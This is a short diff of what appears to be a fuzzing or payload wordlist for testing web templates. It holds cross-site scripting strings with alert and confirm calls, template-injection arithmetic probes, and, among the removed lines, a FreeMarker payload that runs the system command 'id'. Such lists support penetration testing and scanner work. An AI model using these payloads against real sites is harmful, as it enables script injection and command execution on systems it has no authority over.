@@ -287,7 +287,6 @@ ${{<%[%'"}}%\
 <%<!--'%><script>alert(42);</script -->
 <%<!--'%><script>alert(42);</script -->: \');confirm(1);//
 <%<!--'%><script>confirm(1);</script -->
-<%=	puts	"test"	%>
 <%= (math.random()*1e256).tostring(36) %>
 <%= 3 * 3 %>
 <%= 7 * 7 %>
@@ -322,9 +321,6 @@ ${{<%[%'"}}%\
 @{{7*7}}
 @{{{{{{{
 @{{{{{{{{{{{
-[#assign ex = 'freemarker.template.utility.execute'?new()]${ ex('id')}
-[7*7]#{ 3 * 3 }
-[[${42*42}]]
 a=`${alert/*}`;
 application-${clazz.classname}.xml.ftl
 application-${clazz.classname}.xml.ftl.svn-base
